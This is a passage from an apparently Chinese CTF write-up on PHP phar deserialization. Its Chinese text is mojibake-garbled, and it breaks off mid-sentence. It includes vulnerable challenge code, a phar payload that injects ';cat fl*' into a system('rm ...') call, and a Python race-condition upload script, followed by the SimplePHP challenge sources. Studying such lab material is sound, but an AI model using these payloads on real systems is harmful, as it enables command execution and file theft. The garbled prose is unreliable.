$zip-&gt;open(&#x27;1.zip&#x27;,ZipArchive::CREATE); </span><br><span class="line">Â  Â  Â $zip-&gt;addFromString(&#x27;crispr.txt&#x27;, &#x27;...&#x27;);</span><br><span class="line">Â  Â  Â $zip-&gt;setArchiveComment($phar_file);</span><br><span class="line">Â  Â  Â $zip-&gt;close();</span><br></pre></td></tr></table></figure><hr><h5 id="é¢˜ç›®ä¸€-1"><a href="#é¢˜ç›®ä¸€-1" class="headerlink" title="é¢˜ç›®ä¸€"></a>é¢˜ç›®ä¸€</h5><h6 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Â class filter&#123;</span><br><span class="line">Â  Â  Â public $filename;</span><br><span class="line">Â  Â  Â public $filecontent;</span><br><span class="line">Â  Â  Â public $evilfile=false;</span><br><span class="line">Â  Â  Â public $admin = false;</span><br><span class="line">Â â€‹</span><br><span class="line">Â  Â  Â public function __construct($f,$fn)&#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;filename=$f;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;filecontent=$fn;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function checkevil()&#123;</span><br><span class="line">Â  Â  Â  Â  Â if(preg_match(&#x27;/php\.\./i&#x27;, $this-&gt;filename))&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â $this-&gt;evilfile=true;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â if(preg_match(&#x27;/flag/i&#x27;, $this-&gt;filecontent))&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â $this-&gt;evilfile=true;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â return $this-&gt;evilfile;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function __destruct()&#123;</span><br><span class="line">Â  Â  Â  Â  Â if($this-&gt;evilfile &amp;&amp; $this-&gt;admin)&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â system(&#x27;rm &#x27;.$this-&gt;filename);</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â if(isset($_GET[&#x27;fn&#x27;]))&#123;</span><br><span class="line">Â  Â  Â $content = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">Â  Â  Â $f = new filter($_GET[&#x27;fn&#x27;],$content);</span><br><span class="line">Â  Â  Â if($f-&gt;checkevil()===false)&#123;</span><br><span class="line">Â  Â  Â  Â  Â file_put_contents($_GET[&#x27;fn&#x27;], $content);</span><br><span class="line">Â  Â  Â  Â  Â copy($_GET[&#x27;fn&#x27;],md5(mt_rand()).&#x27;.txt&#x27;);</span><br><span class="line">Â  Â  Â  Â  Â unlink($_SERVER[&#x27;DOCUMENT_ROOT&#x27;].&#x27;/&#x27;.$_GET[&#x27;fn&#x27;]);</span><br><span class="line">Â  Â  Â  Â  Â echo &#x27;work done&#x27;;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â </span><br><span class="line">Â &#125;else&#123;</span><br><span class="line">Â  Â  Â echo &#x27;where is flag?&#x27;;</span><br><span class="line">Â &#125;</span><br></pre></td></tr></table></figure><h6 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h6><ul><li>å…¥å£ç‚¹æ˜¯<code>file_put_content</code>å‡½æ•°ï¼Œå»å†™å…¥pharæ–‡ä»¶ã€‚</li><li>è¯¥å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨pharä¼ªåè®®</li><li>å†é€šè¿‡ç¬¬äºŒä¸ªå‚æ•°<code>content</code>ä¼ å…¥pharæ–‡ä»¶æ•°æ®</li><li>è¿™æ ·é€šè¿‡pharä¼ªåè®®è§£æçš„æ—¶å€™å°±ä¼šå¯¹metadataçš„éƒ¨åˆ†ååºåˆ—åŒ–</li><li>ä¸è¿‡é¢˜ç›®ä¼šåˆ é™¤æ–‡ä»¶ï¼ˆåœ¨ææ„å¯¹è±¡çš„æ—¶å€™ï¼‰ï¼Œæ‰€ä»¥éœ€è¦æ¡ä»¶ç«äº‰ã€‚</li></ul><h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><p>æ„é€ pharæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â class filter </span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $filename = &#x27;;cat fl*&#x27;;</span><br><span class="line">Â  Â  Â public $evilfile = true;</span><br><span class="line">Â  Â  Â public $admin = true;</span><br><span class="line">Â &#125;</span><br><span class="line">Â // åç¼€å¿…é¡»ä¸ºphar</span><br><span class="line">Â $phar = new Phar(&quot;evil.phar&quot;);</span><br><span class="line">Â $phar-&gt;startBuffering();</span><br><span class="line">Â // è®¾ç½® stubb</span><br><span class="line">Â $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">Â $o = new filter();</span><br><span class="line">Â /**</span><br><span class="line">Â  * å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span><br><span class="line">Â  */</span><br><span class="line">Â $phar-&gt;setMetadata($o);</span><br><span class="line">Â // æ·»åŠ éœ€å‹ç¼©çš„æ–‡ä»¶</span><br><span class="line">Â $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">Â $phar-&gt;stopBuffering();</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><p>python è„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Â import base64</span><br><span class="line">Â import requests</span><br><span class="line">Â import threading</span><br><span class="line">Â â€‹</span><br><span class="line">Â flag = False</span><br><span class="line">Â url = &#x27;...&#x27;</span><br><span class="line">Â data = open(&#x27;./evil.phar&#x27;, &#x27;rb&#x27;).read()</span><br><span class="line">Â pre_resp = requests.get(url)</span><br><span class="line">Â if pre_resp.status_code != 200:</span><br><span class="line">Â  Â  Â print(url + &#x27;\né“¾æ¥å¥½åƒæŒ‚äº†....&#x27;)</span><br><span class="line">Â  Â  Â exit(1)</span><br><span class="line">Â def upload():</span><br><span class="line">Â  Â  Â requests.post(url+&quot;?fn=evil.phar&quot;, data=data)</span><br><span class="line">Â def read():</span><br><span class="line">Â  Â  Â global flag</span><br><span class="line">Â  Â  Â r = requests.post(url+&quot;?fn=phar://evil.phar/&quot;, data=&quot;&quot;)</span><br><span class="line">Â  Â  Â if &quot;ctfshow&#123;&quot; in r.text and flag is False:</span><br><span class="line">Â  Â  Â  Â  Â print(base64.b64encode(r.text.encode()))</span><br><span class="line">Â  Â  Â  Â  Â flag = True</span><br><span class="line">Â while flag is False:</span><br><span class="line">Â  Â  Â a = threading.Thread(target=upload)</span><br><span class="line">Â  Â  Â b = threading.Thread(target=read)</span><br><span class="line">Â  Â  Â a.start()</span><br><span class="line">Â  Â  Â b.start()</span><br></pre></td></tr></table></figure><hr><h5 id="é¢˜ç›®äºŒ"><a href="#é¢˜ç›®äºŒ" class="headerlink" title="é¢˜ç›®äºŒ"></a>é¢˜ç›®äºŒ</h5><p>[SWPUCTF 2018]SimplePHP 1</p><h6 id="æºç -1"><a href="#æºç -1" class="headerlink" title="æºç "></a>æºç </h6><p>file.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php </span><br><span class="line">Â header(&quot;content-type:text/html;charset=utf-8&quot;); Â </span><br><span class="line">Â include &#x27;function.php&#x27;; </span><br><span class="line">Â include &#x27;class.php&#x27;; </span><br><span class="line">Â ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); </span><br><span class="line">Â $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; </span><br><span class="line">Â if(empty($file)) &#123; </span><br><span class="line">Â  Â  Â echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; </span><br><span class="line">Â &#125; </span><br><span class="line">Â $show = new Show(); </span><br><span class="line">Â if(file_exists($file)) &#123; </span><br><span class="line">Â  Â  Â $show-&gt;source = $file; </span><br><span class="line">Â  Â  Â $show-&gt;_show(); </span><br><span class="line">Â &#125; else if (!empty($file))&#123; </span><br><span class="line">Â  Â  Â die(&#x27;file doesn\&#x27;t exists.&#x27;); </span><br><span class="line">Â &#125; </span><br><span class="line">Â ?&gt; </span><br></pre></td></tr></table></figure><p>upload_file.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php </span><br><span class="line">Â include &#x27;function.php&#x27;; </span><br><span class="line">Â upload_file(); </span><br><span class="line">Â ?&gt; </span><br><span class="line">Â &lt;html&gt; </span><br><span class="line">Â &lt;head&gt; </span><br><span class="line">Â &lt;meta charest=&quot;utf-8&quot;&gt; </span><br><span class="line">Â &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; </span><br><span class="line">Â &lt;/head&gt; </span><br><span class="line">Â &lt;body&gt; </span><br><span class="line">Â &lt;div align = &quot;center&quot;&gt; </span><br><span class="line">Â  Â  Â  Â  Â &lt;h1&gt;å‰ç«¯å†™å¾—å¾ˆlow,è¯·å„ä½å¸ˆå‚…è§è°…!&lt;/h1&gt; </span><br><span class="line">Â &lt;/div&gt; </span><br><span class="line">Â &lt;style&gt; </span><br><span class="line">Â  Â  Â p&#123; margin:0 auto&#125; </span><br><span class="line">Â &lt;/style&gt; </span><br><span class="line">Â &lt;div&gt; </span><br><span class="line">Â &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; </span><br><span class="line">Â  Â  Â &lt;label for=&quot;file&quot;&gt;æ–‡ä»¶å:&lt;/label&gt; </span><br><span class="line">Â  Â  Â &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; </span><br><span class="line">Â  Â  Â &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt; </span><br><span class="line">Â &lt;/div&gt; </span><br><span class="line">Â â€‹</span><br><span class="line">Â &lt;/script&gt; </span><br><span class="line">Â &lt;/body&gt; </span><br><span class="line">Â &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>function.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php </span><br><span class="line">Â //show_source(__FILE__); </span><br><span class="line">Â include &quot;base.php&quot;; </span><br><span class="line">Â header(&quot;Content-type: text/html;charset=utf-8&quot;); </span><br><span class="line">Â error_reporting(0); </span><br><span class="line">Â function upload_file_do() &#123; </span><br><span class="line">Â  Â  Â global $_FILES; </span><br><span class="line">Â  Â  Â $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; </span><br><span class="line">Â  Â  Â //mkdir(&quot;upload&quot;,0777); </span><br><span class="line">Â  Â  Â if(file_exists(&quot;upload/&quot; . $filename)) &#123; </span><br><span class="line">Â  Â  Â  Â  Â unlink($filename); </span><br><span class="line">Â  Â   &#125; </span><br><span class="line">Â  Â  Â move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </span><br><span class="line">Â  Â  Â echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">Â &#125; </span><br><span class="line">Â function upload_file() &#123; </span><br><span class="line">Â  Â  Â global $_FILES; </span><br><span class="line">Â  Â  Â if(upload_file_check()) &#123; </span><br><span class="line">Â  Â  Â  Â  Â upload_file_do(); </span><br><span class="line">Â  Â   &#125; </span><br><span class="line">Â &#125; </span><br><span class="line">Â function upload_file_check() &#123; </span><br><span class="line">Â  Â  Â global $_FILES; </span><br><span class="line">Â  Â  Â $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); </span><br><span class="line">Â  Â  Â $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); </span><br><span class="line">Â  Â  Â $extension = end($temp); </span><br><span class="line">Â  Â  Â if(empty($extension)) &#123; </span><br><span class="line">Â  Â  Â  Â  Â //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br><span class="line">Â  Â   &#125; </span><br><span class="line">Â  Â  Â else&#123; </span><br><span class="line">Â  Â  Â  Â  Â if(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â return true; </span><br><span class="line">Â  Â  Â  Â   &#125; </span><br><span class="line">Â  Â  Â  Â  Â else &#123; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â return false; </span><br><span class="line">Â  Â  Â  Â   &#125; </span><br><span class="line">Â  Â   &#125; </span><br><span class="line">Â &#125; </span><br><span class="line">Â ?&gt; </span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â class C1e4r</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $test;</span><br><span class="line">Â  Â  Â public $str;</span><br><span class="line">Â  Â  Â public function __construct($name)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;str = $name;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function __destruct()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;test = $this-&gt;str;</span><br><span class="line">Â  Â  Â  Â  Â echo $this-&gt;test;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â â€‹</span><br><span class="line">Â class Show</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $source;</span><br><span class="line">Â  Â  Â public $str;</span><br><span class="line">Â  Â  Â public function __construct($file)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;source = $file; Â  //$this-&gt;source = phar://phar.jpg</span><br><span class="line">Â  Â  Â  Â  Â echo $this-&gt;source;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function __toString()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">Â  Â  Â  Â  Â return $content;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function __set($key,$value)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;$key = $value;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function _show()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â if(preg_match(&#x27;/httphttpsfile:gopherdict\.\.f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â die(&#x27;hacker!&#x27;);</span><br><span class="line">Â  Â  Â  Â   &#125; else &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â highlight_file($this-&gt;source);</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â </span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function __wakeup()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â if(preg_match(&quot;/httphttpsfile:gopherdict\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â echo &quot;hacker~&quot;;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â class Test</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â  Â public $file;</span><br><span class="line">Â  Â  Â public $params;</span><br><span class="line">Â  Â  Â public function __construct()</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $this-&gt;params = array();</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function __get($key)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â return $this-&gt;get($key);</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function get($key)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â $value = $this-&gt;params[$key];</span><br><span class="line">Â  Â  Â  Â   &#125; else &#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â $value = &quot;index.php&quot;;</span><br><span class="line">Â  Â  Â  Â   &#125;</span><br><span class="line">Â  Â  Â  Â  Â return $this-&gt;file_get($value);</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â  Â  Â public function file_get($value)</span><br><span class="line">Â  Â   &#123;</span><br><span class="line">Â  Â  Â  Â  Â $text = base64_encode(file_get_contents($value));</span><br><span class="line">Â  Â  Â  Â  Â return $text;</span><br><span class="line">Â  Â   &#125;</span><br><span class="line">Â &#125;</span><br><span class="line">Â ?&gt;</span><br></pre></td></tr></table></figure><p>base.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php </span><br><span class="line">Â  Â  Â session_start(); </span><br><span class="line">Â ?&gt; </span><br><span class="line">Â &lt;!DOCTYPE html&gt; </span><br><span class="line">Â &lt;html&gt; </span><br><span class="line">Â &lt;head&gt; </span><br><span class="line">Â  Â  Â &lt;meta charset=&quot;utf-8&quot;&gt; </span><br><span class="line">Â  Â  Â &lt;title&gt;web3&lt;/title&gt; </span><br><span class="line">Â  Â  Â &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; </span><br><span class="line">Â  Â  Â &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">Â  Â  Â &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">Â &lt;/head&gt; </span><br><span class="line">Â &lt;body&gt; </span><br><span class="line">Â  Â  Â &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; </span><br><span class="line">Â  Â  Â  Â  Â &lt;div class=&quot;container-fluid&quot;&gt; </span><br><span class="line">Â  Â  Â  Â  Â &lt;div class=&quot;navbar-header&quot;&gt; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;é¦–é¡µ&lt;/a&gt; </span><br><span class="line">Â  Â  Â  Â  Â &lt;/div&gt; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;æŸ¥çœ‹æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;ä¸Šä¼ æ–‡ä»¶&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â &lt;/ul&gt; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#x27;REMOTE_ADDR&#x27;];?&gt;&lt;/a&gt;&lt;/li&gt; </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â &lt;/ul&gt; </span><br><span class="line">Â  Â  Â  Â  Â &lt;/div&gt; </span><br><span class="line">Â  Â  Â &lt;/nav&gt; </span><br><span class="line">Â &lt;/body&gt; </span><br><span class="line">Â &lt;/html&gt; </span><br><span class="line">Â &lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure><h6 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h6><ul><li>æœ¬é¢˜æ˜¯é€šè¿‡file.phpæ¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œè¯»å–åˆ°å…¶ä»–PHPçš„æºä»£ç </li><li>base.phpé‡Œé¢è¯´flagåœ¨f1ag.phpä¸­ï¼Œæƒ³åŠæ³•è¯»å–ã€‚</li><li>upload.phpæœ‰ä¸€ä¸ªæ–‡ä»¶é•¿ä¼ çš„å…¥å£ï¼Œè€Œä¸”æ²¡æœ‰çœ‹åˆ°ååºåˆ—åŒ–çš„å…¥å£</li><li>ç›²çŒœåº”è¯¥æ˜¯pharæ–‡ä»¶ä¸Šä¼ å¹¶åŒ…å«è§¦å‘ååºåˆ—ã€‚</li><li>æ ¹æ®function.phpï¼Œå°±æ˜¯è¦æ±‚ä¸Šä¼ å›¾ç‰‡åç¼€ï¼Œç›´æ¥å†™ä¸ªé©¬å‹ç¼©ï¼Œæ”¹åç¼€ï¼Œé€šè¿‡file.phpå»åŒ…å«</li><li>é‚£ä¹ˆå…³é”®å°±æ˜¯class.php é‡Œé¢çš„ä¸€äº›ç±»å»æ„é€ 